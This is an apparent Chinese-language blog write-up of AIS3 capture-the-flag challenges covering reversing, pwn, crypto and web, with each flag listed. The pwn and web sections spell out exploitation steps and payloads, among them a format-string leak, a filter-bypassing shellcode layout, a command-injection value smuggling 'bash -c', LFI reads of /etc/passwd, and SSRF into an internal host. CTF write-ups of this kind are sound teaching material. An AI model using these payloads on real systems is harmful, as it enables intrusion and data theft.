<p>這題給了給 <code>PE</code> 的執行檔，原本以為要逆向 windows 了，打開後看到一堆 python 的函式庫還有 tkinter，發現他是用 PyInstaller 包的，參考 <a target="_blank" rel="noopener" href="http://o1o1o1o1o.blogspot.com/2016/11/python-pyinstaller-reverse-engineer.html">這篇</a> 用官方的 <a target="_blank" rel="noopener" href="https://github.com/pyinstaller/pyinstaller/blob/develop/archive_viewer.py">archive_viewer.py</a> 把 pyc 拉出來 ( 其實好像是 pyd 檔才對，好像格式上差了一點 )，在逆 pyc 的時候確定版本很重要，拉出來的 pyc 沒有 magic value header，可以隨便再撈個比如 <code>pyimod01_os_path</code> 出來，這個就有 magic value 是 <code>550d 0d0a</code>，所以是 Python 3.8 b4 版，先嘗試用了一下 <code>uncompyle6</code> 去還原原始碼，可是他噴錯然後失敗了，那我們就直接看 bytecode 吧，用 <code>marshal.loads</code> 載入為 code object 再用 <code>dis.dis</code> 去 disassemble，邊猜他的原始碼，可以邊用 <code>dis.dis(compile('x = 1', 'filename', 'exec'))</code> 去驗證，看了一下會發現</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, [secret[i] ^ notes[i % <span class="built_in">len</span>(notes)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret))]))</span><br></pre></td></tr></table></figure>
<p><code>flag</code> 是用 <code>secret</code> 和 <code>notes</code> xor 出來的，<code>secret</code> 是寫死的，<code>notes</code> 是從 <code>input</code> 輸入進來的，然後做了下面的計算算出 <code>result</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">notes = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, notes))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] + notes[i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(notes) - <span class="number">1</span>):</span><br><span class="line">    result.append(notes[i] - notes[i+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<p>最後把 <code>result</code> 跟一個固定的陣列做比較，所以我們有 <code>a+b</code> 和 <code>a-b</code> 只要把兩個加起來除以二就拿到 <code>a</code> 了，把 <code>notes</code> 還原再跟 <code>secret</code> xor 就得到 <code>flag</code> 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;th1s_fl4g_red_lik3_ros3s_f1lls_ta1wan&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Uroboros">Uroboros</h3>
<p>這題給了一個 <code>ELF</code> 執行檔，是 C++ 寫的，總之就逆他，發現他是一個 circular double linked list，結構就像下面這樣很普通。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123; </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>* prev;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>* next;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>總共有 314 個 Node，對輸入的每個字，他會先往下走 <strong>輸入的字乘上 7</strong> 次然後把走到的那個 Node 的值乘 64 加上 counter，counter 就是一開始是 1，每經過一個字加一，最後把整段輸出跟某個答案比較，對了就代表你的輸入就是 flag，所以就照著解回來，把數字當成 64 進位拆開，比如第 141 個 Node 存的 <code>70</code> 拆成 <code>64 * 1 + 6</code>，代表第一個和第六個字是 ‘A’，因為 <code>ord('A') * 7 = 141 ( mod 341 )</code>，就是把 <code>141 * inverse(7, 341) = 65 = ord('A')</code>，就這樣。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4ll_humonculus_h4v3_a_ur0b0r0s_m4rk_0n_the1r_b0dy&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Pwn">Pwn</h2>
<h3 id="BOF">BOF</h3>
<p>最簡單的 buffer overflow，裡面已經有一個函式，直接呼叫就拿到 shell 了，但是記得要跳到 <code>push rbp</code> 下一行，如果跳到 <code>push rbp</code> 的話 stack 會沒有對齊 16 的倍數，做 <code>system</code> 的時候會進到 child thread 然後跑到 <code>movaps XMMWORD PTR [rsp+0x40], xmm0</code> 因為沒對齊就掛了，然後 child thread 死掉 <code>system</code> 就會執行完跳出來 ( 都還沒打到指令 )，出來跑到函式結尾 <code>return</code> 的時候又會掛掉，因為正常呼叫函式都會把 return address 放到 stack 上，但是直接跳過去就沒有放，他就會 return 到奇怪的位置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Nonsense">Nonsense</h3>
<p>這題讓我們輸入 shellcode，然後會檢查 shellcode 裡面有沒有 <code>wubbalubbadubdub</code> 這段字，並且在這段字前面的每個字都要小於等於 31，而找到那段字之後就會直接跳出檢查函式，所以那段字的後面都不會被檢查了，那我們的 shellcode 就構造成最開頭先 <code>ja</code> 跳到後面真正的 shellcode，然後中間放 <code>wubbalubbadubdub</code>，就完成了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ja shellcode</span><br><span class="line">... (some padding instructions)</span><br><span class="line">wubbalubbadubdub</span><br><span class="line">shellcode:</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Portal-Gun">Portal Gun</h3>
<p>這題就是用 <code>gets</code> 的 bof，有一個函式有用到 <code>system('sh')</code>，但是他有 <code>LD_PRELOAD</code> 一個 <code>hook.so</code> 裡面把 <code>system</code> hook 掉了，所以不能直接叫，那就堆 ROP leak libc address 再自己跳進去 system 吧。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;U5E_Port@L_6uN_7o_GET_tHe_$h3L1_0_o&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Morty-School">Morty School</h3>
<p>這題一開始就給你 leak libc address 給你，接下來你可以挑一個 Morty 教，但你給的 index 他沒有檢查，所以可以任意寫一個位址，但是不是直接寫值上去，而是寫到你給他的位址裡面放的位址裡面的值，所以找一下哪裡有存 <code>__stack_chk_fail</code> got 的位址，利用他去寫 <code>__stack_chk_fail</code> 的 got 改成我們串好的 ROP gadgets，然後寫爆 stack（ 因為這裡也有 overflow ），就跳去做 ROP 了，一開始有想直接跳 one gadgets 但是條件都不符，所以就自己做 ROP 做 <code>system('/bin/sh')</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;s7ay_At_h0ME_And_Keep_$Oc1@L_D1$T4Nc3,M0rTyS&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Death-Crystal">Death Crystal</h3>
<p>這題是 format string，但是有檢查輸入，所有字都不能有 <code>$</code>, <code>\</code>, <code>/</code>, <code>^</code>，並且 <code>%</code> 後面都不能有 <code>c</code>, <code>p</code>, <code>n</code>, <code>h</code>，主要是不能用 <code>$</code> 去指定參數，但沒關係就多放幾個 padding 用的把參數推過去就好了，他的 <code>flag</code> 已經讀進來放到 <code>0x202060</code> 了，但是 PIE 有開所以還是要 leak 一下 code base address，要繞過檢查只要前面隨便放個數字就好了，比如 <code>%1p</code>，先 <code>b'%1p' * 11 + b';%1p'</code> leak 出 code base address，然後再 <code>b'%d' * 8 + b'%100sAA\x00' + p64(base + 0x202060)</code> 就拿到 flag 了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;FOrM@T_5TRin6_15_$o0o_pOw3rFul_And_eAsY&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Meeseeks-Box">Meeseeks Box</h3>
<p>這題是 heap 題，很一般的有 <code>create</code>, <code>show</code>, <code>delete</code> 的題目，然後沒什麼檢查，而且是 ubuntu 18.04 有 tcache 可以用，所以先弄個夠大的 chunk 然後 free 掉他讓他進到 unsorted bins 就可以拿 libc address 了，然後有 tcache 可以隨便 double free 他去把 <code>__malloc_hook</code> 寫成 one gadget 的位址就完成了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;G0D_d4mn!_Mr._M3e5EEk5_g1V3S_Y0U_@_sH31l&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Crypto">Crypto</h2>
<h3 id="Brontosaurus">Brontosaurus</h3>
<p>給了一個檔案叫 <code>KcufsJ</code> 裡面是 jsfuck 混淆過的 js code，他的檔名就是倒過來的 jsfuck，所以內容也要倒過來，開瀏覽器 console 執行一下就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Br0n7Os4uru5_ch3at_3asi1Y&#125;</span><br></pre></td></tr></table></figure>
<h3 id="T-Rex">T-Rex</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">         !       @       #       $       %       &amp;</span><br><span class="line"></span><br><span class="line"> !       V       F       Y       J       6       1</span><br><span class="line"></span><br><span class="line"> @       5       0       M       2       9       L</span><br><span class="line"></span><br><span class="line"> #       I       W       H       S       4       Q</span><br><span class="line"></span><br><span class="line"> $       K       G       B       X       T       A</span><br><span class="line"></span><br><span class="line"> %       E       3       C       7       P       N</span><br><span class="line"></span><br><span class="line"> &amp;       U       Z       8       R       D       O</span><br><span class="line"></span><br><span class="line">&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## ! # &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $%  ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @ @ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;#  &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# % &amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;</span><br></pre></td></tr></table></figure>
<p>給了一張表和密文，對表轉回去就好了，但要注意 row 和 column 的順序，<code>&amp;$</code> 是 A 不是 R。</p>
<h3 id="Octopus">Octopus</h3>
<p>這題給 python script 和他執行後的 output，裡面在做 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Quantum_key_distribution#BB84_protocol:_Charles_H._Bennett_and_Gilles_Brassard_(1984)">BB84 量子密鑰分發</a>，兩邊的 Basis 都給了，Qubits 也給了，就是把 Basis 一樣部分的那些 Qubits 抓出來轉回 binary 就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Blowfish">Blowfish</h3>
<p>這題要 <code>nc 60.250.197.227 12001</code>，有給原始碼，還有一個 python pickle dump 的檔案</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&#x27;name&#x27;: &#x27;maojui&#x27;, &#x27;password&#x27;: &#x27;SECRET&#x27;, &#x27;admin&#x27;: False&#125;, &#123;&#x27;name&#x27;: &#x27;djosix&#x27;, &#x27;password&#x27;: &#x27;S3crE7&#x27;, &#x27;admin&#x27;: False&#125;, &#123;&#x27;name&#x27;: &#x27;kaibro&#x27;, &#x27;password&#x27;: &#x27;GGInIn&#x27;, &#x27;admin&#x27;: False&#125;, &#123;&#x27;name&#x27;: &#x27;others&#x27;, &#x27;password&#x27;: &#x27;_FLAG_&#x27;, &#x27;admin&#x27;: False&#125;]</span><br></pre></td></tr></table></figure>
<p>連上去之後，他會給你這段用 Blowfish 的 CTR Mode 加密的結果當作 token，接著你就可以再把 token 丟回去給他解密，他會看你是不是 admin，因為是 CTR Mode 所以就翻一下 bit 就好了，把那個 False 的部分翻成 True，就這麼簡單。<br>
詳情可以參考 <a target="_blank" rel="noopener" href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">這份投影片</a> Bit-Flipping Attack 的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;ATk_BloWf1sH-CTR_by_b1t_Flipping_^_^&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Camel">Camel</h3>
<p>這題給了 sage script，裡面有一個 Elliptic Curve，並給了上面的 9 個點，flag 就是 Elliptic Curve 的參數，因為他給的點的 x 座標都是 $p-1, p+1, p+2, …$，所以帶進 $y^2 = x^3 + a x + b$ 式子 mod p 之後 p 就都不見了</p>
<p>$$<br>
\begin{align}<br>
&amp;(p-1)^3 + a (p-1) + b = -1 - a + b \pmod{p} \\<br>
&amp;(p+1)^3 + a (p+1) + b = 1 + a + b \pmod{p}<br>
\end{align}<br>
$$</p>
<p>上面兩式相加之後可以得到 <code>2b</code>，還有其他兩組 <code>p+3</code>, <code>p-3</code>, <code>p+5</code>, <code>p-5</code> 也是同樣的情況，所以我們可以拿到三組 <code>2b + kp</code> 這樣形式的東西，把他們互減去做 gcd 就得到 <code>p</code> 了，有 <code>p</code> 之後就帶回去就可以得到 <code>a, b</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;Curv3_Mak3_M3_Th1nK_Ab0Ut_CaME1_A_P&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Turtle">Turtle</h3>
<p>這題就是 Padding Oracle Attack，我把以前的 script 拿出來然後把 oracle 換成用 requests 去抓就完成了。<br>
詳情可以參考 <a target="_blank" rel="noopener" href="https://github.com/oalieno/Crypto-Course/blob/master/Block-Cipher-Mode/Block-Cipher-Mode.pdf">這份投影片</a> Padding Oracle Attack 的部分。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5l0w_4nd_5734dy_w1n5_7h3_r4c3.&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Web">Web</h2>
<h3 id="Squirrel">Squirrel</h3>
<p>這題網站在 <a target="_blank" rel="noopener" href="https://squirrel.ais3.org/%EF%BC%8C%E6%89%93%E9%96%8B%E7%9C%8B%E4%B8%80%E4%B8%8B%E6%B5%81%E9%87%8F%E6%9C%83%E7%9C%8B%E5%88%B0%E6%9C%89%E4%B8%80%E5%80%8B%E8%AB%8B%E6%B1%82%E6%98%AF">https://squirrel.ais3.org/，打開看一下流量會看到有一個請求是</a> <code>/api.php?get=/etc/passwd</code>，看起來是直接給你 local file inclusion，抓一下網站原始碼 <code>/api.php?get=/var/www/html/api.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application\/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;cat &#x27;<span class="subst">$file</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;output&#x27;</span> =&gt; <span class="variable">$output</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;cannot get file&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;empty file path&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看起來是 command injection，<code>/api.php?get='|bash -c 'ls</code> 就可以執行任意 command 了，<code>ls /</code> 看根目錄有個 <code>5qu1rr3l_15_4_k1nd_0f_b16_r47.txt</code> 裡面就是 flag 了 ( 剛好檔名跟 flag 一樣，真佛心 )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5qu1rr3l_15_4_k1nd_0f_b16_r47&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Shark">Shark</h3>
<p>這題網站在 <a target="_blank" rel="noopener" href="https://shark.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E5%80%8B%E9%80%A3%E7%B5%90%E9%BB%9E%E4%B8%8B%E5%8E%BB%E5%B0%B1%E6%98%AF">https://shark.ais3.org/，首頁有個連結點下去就是</a> <code>/?path=hint.txt</code>，又是 local file inclusion，但是 hint 說</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please find the other server in the internal network! (flag is on that server)</span><br><span class="line"></span><br><span class="line">    GET http://some-internal-server/flag</span><br></pre></td></tr></table></figure>
<p>那就先看一下原始碼 <code>/?path=/var/www/html/index.php</code>，直接看會拿到 <code>[forbidden]</code>，那隨便繞一下 <code>/?path=file:///var/www/html/index.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(\.|\/)/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="comment">// disallow /path/like/this and ../this</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;[forbidden]&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$content</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>, <span class="literal">FALSE</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . (<span class="variable">$content</span> ? <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$content</span>) : <span class="string">&#x27;[empty]&#x27;</span>) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;🦈🦈🦈&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;🦈🦈🦈&lt;/h1&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;?path=hint.txt&quot;</span>&gt;Shark <span class="keyword">never</span> cries?&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>有用 regex 檢查開頭不能是 <code>.</code> 和 <code>/</code>，所以 <code>file://</code> 或 <code>php://filter/read=convert.base64-encode/resource=</code> 都可以繞，再來看 <code>/?path=file:///etc/hosts</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">172.22.0.3	02b23467485e</span><br></pre></td></tr></table></figure>
<p>瀏覽一下 <code>/?path=http://02b23467485e</code> 發現是本機，那就找找子網路下的鄰居們，就找到 <code>/?path=http://172.22.0.2/flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;5h4rk5_d0n&#x27;7_5w1m_b4ckw4rd5&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Elephant">Elephant</h3>
<p>這題網站在 <a target="_blank" rel="noopener" href="https://elephant.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E5%8F%AF%E4%BB%A5%E7%99%BB%E5%85%A5%EF%BC%8C%E9%9A%A8%E4%BE%BF%E8%BC%B8%E5%85%A5%E5%80%8B">https://elephant.ais3.org/，首頁可以登入，隨便輸入個</a> username 就登入了不需要密碼，第一步當然是找找有沒有原始碼，看了一下 <code>robots.txt</code> 沒東西，再看 <code>.git</code> 是 Forbidden，中獎，隨便找個 GitDumper 把 <code>.git</code> 抓下來，<code>git log</code> 看到前一個 commit 把原始碼刪掉了，<code>git reset --hard</code> 回去，原始碼如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SESSION</span> = <span class="string">&#x27;elephant_user&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="title function_ invoke__">rand</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strcmp</span>(<span class="variable">$flag</span>, <span class="variable">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(SESSION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span 